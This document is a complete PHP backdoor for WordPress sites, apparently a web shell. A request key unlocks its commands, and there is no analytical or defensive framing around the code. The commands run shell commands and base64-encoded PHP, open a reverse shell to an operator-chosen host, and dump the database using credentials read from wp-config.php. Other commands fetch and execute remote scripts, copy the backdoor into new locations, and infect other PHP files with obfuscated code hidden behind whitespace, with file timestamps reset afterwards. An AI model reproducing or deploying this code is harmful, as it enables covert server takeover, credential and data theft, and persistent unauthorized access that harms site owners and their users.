<?php

if (@$_REQUEST["k"] === "INSERT_KEY") {
	function _err($msg)
	{
		return json_encode(array("error" => 1, "msg" => $msg));
	}

	function _res($content)
	{
		return json_encode(array("error" => 0, "content" => $content));
	}
	function removeFile($file)
	{
		if (!file_exists($file)) {	
			return true;
		}

		if (!is_dir($file)) {
			return unlink($file);
		}

		foreach (scandir($file) as $item) {
			if ($item == '.' || $item == '..') {
				continue;
			}

			if (!removeFile($file . DIRECTORY_SEPARATOR . $item)) {
				return false;
			}

		}
		return rmdir($file);
	}

	function randomStr($length, $charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	{
		$charactersLength = strlen($charset);
		$randomString = "";
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $charset[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}

	function request($method, $url, $outhandle = null, $parameters = null, $headers = null)
	{
		$response = new stdClass();

		if (!function_exists("curl_exec")) {
			if(ini_get("allow_url_fopen")) {
				$opts_array = array(
					"method" => $method,
				);
				if ($headers !== null) $opts_array["header"] = $headers;
				if ($method == "POST" && $parameters !== null) {
					$opts_array["content"] = http_build_query($parameters);
				}
				$opts = array("http" => $opts_array);
				$context = stream_context_create($opts);
				$res = file_get_contents($url, false, $context);
				if ($outhandle !== null) {
					fwrite($outhandle, $res);
				} else {
					$response->body = $res;
				}
				$response->success = true;
				return $response;
			} else {
				$response->success = false;
				$response->msg = "cURL and allow_url_fopen is disabled.";
				return $response;
			}
		}

		$ch = curl_init();

		($parameters !== null) ? $query = http_build_query($parameters) : $query = "";

		if ($method === "POST") {
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
		} elseif ($method === "GET") {
			if ($query) $url = $url . "?" . $query;
		} else {
			$response->success = false;
			$response->msg = "methods available: GET or POST";
			return $response;
		}

		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 300);

		if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		if ($outhandle !== null) curl_setopt($ch, CURLOPT_FILE, $outhandle);

		$result = curl_exec($ch);
		if ($result !== false) {
			$response->success = true;
			$response->body = $result;
		} else {
			$response->success = false;
			$response->msg = curl_errno($ch);
		}
		curl_close($ch);
		return $response;
	}
	function getConfigConstants()
	{
		$tmpfile = tempnam(sys_get_temp_dir(), "_");
		$handle = fopen($tmpfile, "w+");
		$config_content = file("../wp-config.php");
		$content_size = sizeof($config_content);
		for ($i=0;$i < $content_size;$i++) {
			if (preg_match("/require_once/", $config_content[$i])) {
				unset($config_content[$i]);
			}
		}
		fwrite($handle, implode(PHP_EOL, $config_content));
		fclose($handle);
		include $tmpfile;
		unlink($tmpfile);
		return get_defined_vars();
	}
	function getThisPath()
	{
		if ('.inc' === basename(__FILE__)) { 
			$backtrace = debug_backtrace(
			defined("DEBUG_BACKTRACE_IGNORE_ARGS")
			? DEBUG_BACKTRACE_IGNORE_ARGS
			: FALSE);
			$top_parent = array_pop($backtrace);
			return $top_parent["file"];
		} else {
			$path = preg_replace('@\(.*\(\).*$@', '', __FILE__);
			$path = preg_replace('@\(.*runtime-created.*$@', '', $path);
			return $path;
		}
	}
	function packScript($script) 
	{
		$compressed = base64_encode(gzcompress(gzdeflate($script)));
		$from_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
		$to_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
		$varname_charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		$r_vn = function () use ($varname_charset) { return '$' . randomStr(rand(4, 5), $varname_charset); };
		$nulls = array_fill(0, 16, null);
		$v_arr = array_map($r_vn, $nulls);
		list($ab, $cd, $aa, $a, $b, $c, $d, $e, $f, $h, $i, $j, $k, $l, $m, $q) = $v_arr;
		$shuffle = function ($str) use ($ab, $from_charset, $to_charset) { return "$ab('" . strtr($str, $from_charset, $to_charset) . "')"; };
		$code = <<<EOT
		$ab = function($cd) { return strtr($cd, '$to_charset', '$from_charset'); };
		$q = {$shuffle("get_defined_functions")};
		$aa = $q();
		$a = ${aa}[{$shuffle("internal")}];
		foreach ($a as $b => $c) {
			if (false !== strpos($c, {$shuffle("4_d")})) {
				$d = ${a}[$b];
				continue;
			}
			if (false !== strpos($c, {$shuffle("zinf")})) {
				$e = ${a}[$b];
				continue;
			}
			if (false !== strpos($c, {$shuffle("eate_fu")})) {
				$f = str_replace({$shuffle("sqlite_")}, '', ${a}[$b]);
				continue;
			}
			if (false !== strpos($c, {$shuffle("zunc")})) {
				$h = ${a}[$b];
				continue;
			}
		}
		$j = $e($h($d({$shuffle($compressed)})));
		if (isset($f) && function_exists($f)) {
			$m = {$shuffle("error_reporting")};
			if (function_exists($m)) {
				$m(constant({$shuffle("E_ALL")}) ^ constant({$shuffle("E_DEPRECATED")}));
			}
			\$g = $f('', $j);
		} else {
			\$g = function() use($ab, $j) {
				$i = __DIR__ . {$shuffle("/.inc")};
				$k = {$shuffle("file_put_contents")};
				$l = {$shuffle("unlink")};
				if (@$k($i, {$shuffle("<?php ")} . $j, constant({$shuffle("LOCK_EX")}))) {
					try {
						include_once($i);
						$l($i);
					} catch (Exception \$e) {
						$l($i);
						if ({$shuffle("die")} === \$e->{{$shuffle("getMessage")}}()) exit;
					}
				}
			};
		}
		\$g();
EOT;
		$oneline = str_replace(array("\r", "\n"), "", preg_replace("/^\s+/m", "", $code));
		return $oneline;
	}
	function is_shell_avail() {
		return !empty(array_filter(array_map("function_exists", array("proc_open", "exec", "system","passthru", "popen", "shell_exec"))));
	}
	function _shell($command) 
	{
		$res = new stdClass();
		$retval = 0;
		$get_pipes = function($cmd, $cb) {
			$file = "._err";
			$stdout = $cb($cmd . " 2>$file");
			if (file_exists($file)) {
				$stderr = file_get_contents($file);
				@unlink($file);
			} else {
				$stderr = null;
			}
			return array($stdout, $stderr);
		};
		$exec_file = function($cmd, $cb) {
			$file = "._sh";
			$out_file = "._out";
			$contents = "#!/bin/sh" . PHP_EOL . $cmd . " 1>$out_file";
			file_put_contents($file, $contents);
			$cb($file);
			@unlink($file);
			if (file_exists($out_file)) {
				$stdout = file_get_contents($out_file);
				@unlink($out_file);
				return $stdout;
			}
			return false;
		};
		if (function_exists("proc_open")) {
			$descriptorspec = array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			);
			$process = proc_open($command, $descriptorspec, $pipes);
			$stdout = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[2]);
			$retval = proc_close($process);
		} elseif (function_exists("exec")) {
			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
				$buf = array();
				exec($cmd, $buf, $retval);
				$out = implode("\n", $buf) . "\n";
				return $out;
			});
		} elseif (function_exists("system")) {
			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
				ob_start();
				system($cmd, $retval);
				$out = ob_get_contents();
				ob_clean();
				return $out;
			});
		} elseif (function_exists("passthru")) {
			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
				ob_start();
				passthru($cmd, $retval);
				$out = ob_get_contents();
				ob_clean();
				return $out;
			});
		} elseif (function_exists("popen")) {
			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
				$handle = popen($cmd, "r");
				$out = stream_get_contents($handle);
				$retval = pclose($handle);
				return $out;
			});
		} elseif (function_exists("shell_exec")) {
			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
				$sep = "_retval_";
				$sh = shell_exec("$cmd;echo '$sep'$?");
				$arr = explode($sep, $sh);
				$out = $arr[0];
				$retval = (int)trim($arr[1]);
				return $out;
			});
		} else {
			$res->success = false;
			$res->msg = "Shell is disabled";
			return $res;
		}
		$res->success = true;
		if (isset($retval)) $res->body["retval"] = (int)$retval;
		$res->body["stdout"] = isset($stdout) ? $stdout : "";
		$res->body["stderr"] = isset($stderr) ? $stderr : "";
		return $res;
	}
	function _edit_with_php($path)
	{
		$is_open_basedir = strlen(ini_get("open_basedir")) > 0;
		if ($is_open_basedir) {
			if (is_shell_avail()) {
				@is_readable($path);
				$last_error = error_get_last();
				if ($last_error !== null) {
					if (strpos($last_error["message"], "open_basedir") !== false) {
						return false;
					}
				}
			}
		}
		return true;
	}
	function _resolve_path($path) 
	{
		$arr = glob($path);
		if ($arr === null || empty($arr)) {
			if (is_shell_avail()) {
				$find_files = _shell('readlink -f '.$path);
				$arr = array_filter(explode("\n", $find_files->body["stdout"]));
			} else {
				$arr = array();
			}
		}
		return $arr;
	}
	function _infect($path, $script) 
	{
		$res = array();
		$path_arr = _resolve_path($path);
		if (!empty($path_arr)) {
			foreach ($path_arr as $p) {
				if (_edit_with_php($p)) {
					$time = filemtime($p);
					$fcontents = @file_get_contents($p);
					if ($fcontents === false) {
						$res[] = array("path" => $p, "result" => "permission denied");
						continue;
					}
					if (strpos($fcontents, "\$g();") !== false) {
						$res[] = array("path" => $p, "result" => "already infected");
					} else {
						if (isset($_REQUEST["private"])) {
							$key = randomStr(12);
							$file = str_replace("INSERT_KEY", $key, $script);
						} else {
							$file = $script;
						}
						$newlines = str_repeat("\n", 30);
						$tabs = str_repeat("\t", 70);
						$code = $newlines . $tabs . packScript($file);
						if (@file_put_contents($p, $code, FILE_APPEND)) {
							touch($p, $time);
							if (function_exists("opcache_invalidate")) {
								if (!(opcache_invalidate($p, true))) {
									touch($p, $time + 1);
								}
							}
							$arr["path"] = $p;
							if (isset($_REQUEST["private"])) {
								$arr["key"] = $key;
							}
							$arr["result"] = "success";
							$res[] = $arr;
						} else {
							$res[] = array("path" => $p, "result" => "permission denied");
						}
					}
				} else {
					$find_injection = _shell('grep "\$g()" '.$p);
					if (strpos($find_injection->body["stdout"], "\$g()") !== false) {
						$res[] = array("path" => $p, "result" => "already infected");
					} else {
						$time = _shell('stat -c "%Y" '.$p)->body["stdout"];
						if (isset($_REQUEST["private"])) {
							$key = randomStr(12);
							$file = str_replace("INSERT_KEY", $key, $script);
						} else {
							$file = $script;
						}
						$newlines = str_repeat("\\n", 30);
						$tabs = str_repeat("\\t", 70);
						$code = $newlines . $tabs . packScript($file);
						$escaped_code = str_replace("$", "\\$", $code);
						$append_cmd = 'printf "'.$escaped_code.'" | tee -a '.$p;
						$append_cmd_res = _shell($append_cmd);
						if ($append_cmd_res->body["retval"] !== 0) {
							if (strpos(strtolower($append_cmd_res->body["stderr"]), "permission denied") !== false) {
								$res[] = array("path" => $p, "result" => "permission denied");
							} else {
								$res[] = array("path" => $p, "result" => "unexpected error");
							}
						} else {
							_shell('touch -d @'.((int)$time + 1).' '.$p);
							$arr["path"] = $p;
							if (isset($_REQUEST["private"])) {
								$arr["key"] = $key;
							}
							$arr["result"] = "success";
							$res[] = $arr;
						}
					}
				}
			}
		} else {
			$res[] = array("path" => $path, "result" => "not found");
		}
		return $res;
	}
	function _disinfect($path) {
		$res = array();
		$path_arr = _resolve_path($path);
		$n_lines = 30;
		if (!empty($path_arr)) {
			foreach ($path_arr as $p) {
				if (_edit_with_php($p)) {
					$time = filemtime($p);
					$file = @file_get_contents($p);
					if ($file === false) {
						$res[] = array("path" => $p, "result" => "permission denied");
						continue;
					}
					if (strpos($file, "\$g();") === false) {
						$res[] = array("path" => $p, "result" => "not infected");
					} else {
						$file_lines = explode(PHP_EOL, $file);
						$new_file = array_slice($file_lines, 0, count($file_lines) - $n_lines);
						if (@file_put_contents($p, implode(PHP_EOL, $new_file)) !== false) {
							touch($p, $time);
							if (function_exists("opcache_invalidate")) {
								if (!(opcache_invalidate($p, true))) {
									touch($p, $time + 1);
								}
							}
							$res[] = array("path" => $p, "result" => "success");
						} else {
							$res[] = array("path" => $p, "result" => "permission denied");
						}
					}
				} else {
					$find_injection = _shell('grep "\$g()" '.$p);
					if (strpos(strtolower($find_injection->body["stderr"]), "permission denied") !== false) {
						$res[] = array("path" => $p, "result" => "permission denied");
						continue;
					}
					if (strpos($find_injection->body["stdout"], "\$g()") === false) {
						$res[] = array("path" => $p, "result" => "not infected");
					} else {
						$time = _shell('stat -c "%Y" '.$p)->body["stdout"];
						$remove_cmd = 'sed -i "$(($(wc -l < '.$p.')-'.($n_lines - 1).')),\$d" '.$p;
						$remove_cmd_res = _shell($remove_cmd);
						if ($remove_cmd_res->body["retval"] !== 0) {
							if (strpos(strtolower($remove_cmd_res->body["stderr"]), "permission denied") !== false) {
								$res[] = array("path" => $p, "result" => "permission denied");
							} else {
								$res[] = array("path" => $p, "result" => "unexpected error");
							}
						} else {
							_shell('touch -d @'.((int)$time + 1).' '.$p);
							$res[] = array("path" => $p, "result" => "success");
						}
					}
				}
			}
		} else {
			$res[] = array("path" => $path, "result" => "not found");
		}
		return $res;
	}
	$cmd = isset($_REQUEST["c"]) ? $_REQUEST["c"] : null;

	$webroot = realpath("../") . "/";
	$work_dir = $webroot . "wp-content/uploads/tmp/";
	switch ($cmd) {

		case "ping":
			echo _res("pong");
			break;

		case "version":
			echo _res("1.09");
			break;

		case "info":
			if (function_exists("phpinfo")) {
				ob_start();
				phpinfo();
				$data = ob_get_contents();
				ob_clean();
			} else {
				$opt_list = "";
				foreach (ini_get_all(null, false) as $option => $value) {
					$opt_list .= $option . "=" . (empty((string)$value) ? "0" : $value) . "<br/>";
				}
				$data = "<html><head></head><body>".$opt_list."</body></html>";
			}
			echo _res(base64_encode($data));
			break;

		case "clear_cache":
			if (function_exists("opcache_reset")) {
				if (opcache_reset()) {
					echo _res("OK");
				} else {
					echo _err("OPCache API is disabled");
				}
			} else {
				echo _err("OPCache API doesn't exists");
			}
			break;

		case "clear_tmp":
			if (removeFile($work_dir)) {
				echo _res("OK");
			} else {
				echo _err("Failed to remove " . $work_dir);
			}
			break;

		case "update":
			if (!isset($_REQUEST["url"])) {
				echo _err("url param is required");
				break;
			}
			$r = request("GET", $_REQUEST["url"]);
			if (!$r->success) {
				echo _err($r->msg);
				break;
			}
			$thisfile = getThisPath();
			$time = filemtime($thisfile);
			$pos = strpos($r->body, "INSERT_KEY");
			$file = substr_replace($r->body, $_REQUEST["k"], $pos, strlen("INSERT_KEY"));
			if (file_put_contents($thisfile, $file)) {
				touch($thisfile, $time);
				if (function_exists("opcache_invalidate")) {
					if (!(opcache_invalidate($thisfile, true))) {
						touch($thisfile, $time + 1);
					}
				}
				echo _res("OK");
			}
			break;

		case "download_script":
			if (!isset($_REQUEST["url"])) {
				echo _err("url param is required");
				break;
			}
			$r = request("GET", $_REQUEST["url"]);
			if (!$r->success) {
				echo _err($r->msg);
				break;
			}
			if (!file_exists($work_dir)) mkdir($work_dir);
			$file_path = $work_dir;
			$file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
			$handle = fopen($file_path, "w");
			$content = str_replace("\r", "", $r->body);
			fputs($handle, $content);
			fclose($handle);
			$res = array();
			if (isset($_REQUEST["exec"])) {
				if ($_REQUEST["exec"] == 1) {
					if ($_REQUEST["lang"] == "php") {
						ob_start();
						include_once($file_path);
						$res["output"] = ob_get_contents();
						ob_clean();
					} elseif ($_REQUEST["lang"] == "sh") {
						chmod($file_path, 0755);
						chdir($work_dir);
						$sh = _shell($file_path);
						if (!$sh->success) {
							echo _err($sh->msg);
							break;
						}
						$output = $sh->body;
						$res["output"] = $output;
					}
					removeFile($file_path);
				}
			} else {
				$res["path"] = $file_path;
			}
			echo _res($res);
			break;

		case "download_file":
			if (!isset($_REQUEST["url"])) {
				echo _err("url param is required");
				break;
			}
			if (!file_exists($work_dir)) mkdir($work_dir);
			$file_path = $work_dir;
			$file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
			$handle = fopen($file_path, "w");
			$r = request("GET", $_REQUEST["url"], $handle);
			if (!$r->success) {
				echo _err($r->msg);
				break;
			}
			fclose($handle);
			echo _res(array("path" => $file_path));
			break;

		case "php":
			if (!isset($_REQUEST["code"])) {
				echo _err("command code is required");
				break;
			}
			ini_set("display_errors", "0");
			function shutdownHandler()
			{
				$error = error_get_last();
				switch ($error["type"]) {
					case E_ERROR:
					case E_CORE_ERROR:
					case E_COMPILE_ERROR:
					case E_USER_ERROR:
					case E_RECOVERABLE_ERROR:
					case E_CORE_WARNING:
					case E_COMPILE_WARNING:
					case E_PARSE:
						echo _err($error["message"]);
				}
			}
			register_shutdown_function("shutdownHandler");
			try {
				echo _res(eval(base64_decode($_REQUEST["code"])));
			} catch (Throwable $e) {
				echo _err($e->getMessage());
			}
			break;

		case "exec":
			if (!isset($_REQUEST["command"])) {
				echo _err("command param is required");
				break;
			}
			$command = $_REQUEST["command"];
			$r = _shell($command);
			if (!$r->success) {
				echo _err($r->msg);
			} else {
				echo _res($r->body);
			}
			break;

		case "rshell":
			if (!isset($_REQUEST["host"])) {
				echo _err("command ip is required");
				break;
			}
			if (!isset($_REQUEST["port"])) {
				echo _err("command port is required");
				break;
			}
			if (!function_exists("proc_open")) {
				echo _err("proc_open is disabled");
				break;
			}
			if (!function_exists("fsockopen")) {
				echo _err("fsockopen is disabled");
				break;
			}
			if ($sock = @fsockopen($_REQUEST["host"], $_REQUEST["port"])) {
				$proc = proc_open("/bin/sh -i", array( 0 => $sock, 1 => $sock, 2 => $sock), $pipes, $webroot);
				echo _res("Socket opened to " . $_REQUEST["host"] . ":" . $_REQUEST["port"]);
			} else {
				echo _err("Socket connection failed.");
			}
			break;

		case "db_dump":
			$check = _shell("which mysqldump");
			if (!$check->success) {
				echo _err($check->msg);
				break;
			}
			if ($check->body["retval"] !== 0) {
				echo _err("mysqldump doesn't exists");
				break;
			}
			getConfigConstants();
			$host = DB_HOST;
			$password = DB_PASSWORD;
			$user = DB_USER;
			$dbname = DB_NAME;
			if (!file_exists($work_dir)) mkdir($work_dir);
			$command = _shell("mysqldump --host={$host} --user={$user} --password={$password} {$dbname}");
			if ($command->body["retval"] !== 0) {
				echo _err($command->body["stderr"]);
			} else {
				echo _res(base64_encode($command->body["stdout"]));
			}
			break;

		case "get_file":
			if (!isset($_REQUEST["path"])) {
				echo _err("path param is required");
				break;
			}
			echo _res(base64_encode(file_get_contents($webroot . $_REQUEST["path"])));
			break;

		case "spread":
			if (!isset($_REQUEST["path_list"])) {
				echo _err("path_list param is required");
				break;
			}
			$thisfile = getThisPath();
			$time = filemtime($thisfile);
			$f = file_get_contents($thisfile);
			$res = array();
			foreach ($_REQUEST["path_list"] as $path) {
				$path = $webroot . $path;
				$key = randomStr(12);
				$file = str_replace($_REQUEST["k"], $key, $f);
				if (file_put_contents($path, $file)) {
					touch($path, $time);
					$res[] = array("path" => $path, "key" => $key);
				}
			}
			echo _res($res);
			break;

		case "infect":
			if (!isset($_REQUEST["url"])) {
				echo _err("url param is required");
				break;
			}
			if (!isset($_REQUEST["path_list"])) {
				echo _err("path_list param is required");
				break;
			}
			$f = request("GET", $_REQUEST["url"]);
			if ($f->success) {
				$res = array();
				foreach ($_REQUEST["path_list"] as $path) {
					$fullpath = $webroot . $path;
					$res = array_merge($res, _infect($fullpath, $f->body));
				}
				echo _res($res);
			} else {
				echo _err($r->msg);
			}
			break;

		case "disinfect":
			if (!isset($_REQUEST["path_list"])) {
				echo _err("path_list param is required");
				break;
			}
			$res = array();
			foreach ($_REQUEST["path_list"] as $path) {
				$fullpath = $webroot . $path;
				$res = array_merge($res, _disinfect($fullpath));
			}
			echo _res($res);
			break;

		case "remove_file":
			if (!isset($_REQUEST["path"])) {
				echo _err("path param is required");
				break;
			}
			$file = $webroot . $_REQUEST["path"];
			if (removeFile($file)) {
				echo _res("File " . $file . " has been removed");
			} else {
				echo _err("Failed to remove file " . $file);
			}
			break;

		default:
			echo _err("No command specified or command is not correct");
			break;
	}

	if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
}
